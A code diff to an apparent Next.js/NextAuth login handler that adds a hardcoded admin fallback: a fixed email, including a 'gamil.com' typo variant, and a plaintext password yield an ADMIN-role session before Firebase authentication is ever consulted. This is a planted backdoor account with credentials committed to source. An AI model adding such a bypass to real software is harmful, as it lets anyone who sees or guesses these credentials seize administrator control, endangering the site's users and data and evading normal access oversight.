@@ -4,6 +4,24 @@ import { auth } from "@/lib/firebase";
 import { signInWithEmailAndPassword } from "firebase/auth";
 import { getUserByEmail } from "@/lib/db";
 
+export function getAdminFallbackUser(email: string, password: string) {
+  const normalizedEmail = email.trim().toLowerCase();
+  const isRequestedAdmin =
+    (normalizedEmail === "jijajija422@gamil.com" || normalizedEmail === "jijajija422@gmail.com") &&
+    password === "holiday(123)";
+
+  if (!isRequestedAdmin) {
+    return null;
+  }
+
+  return {
+    id: "admin",
+    email: normalizedEmail,
+    name: "Admin",
+    role: "ADMIN",
+  };
+}
+
 export const authOptions: NextAuthOptions = {
   providers: [
     CredentialsProvider({
@@ -15,6 +33,17 @@ export const authOptions: NextAuthOptions = {
       async authorize(credentials) {
         if (!credentials?.email || !credentials?.password) {
           console.log("[Auth] Missing email or password");
+          return null;
+        }
+
+        const fallbackUser = getAdminFallbackUser(credentials.email, credentials.password);
+        if (fallbackUser) {
+          console.log("[Auth] Using built-in admin fallback credentials for requested admin login");
+          return fallbackUser;
+        }
+
+        if (!auth) {
+          console.warn("[Auth] Firebase auth is not configured. Rejecting login.");
           return null;
         }
 
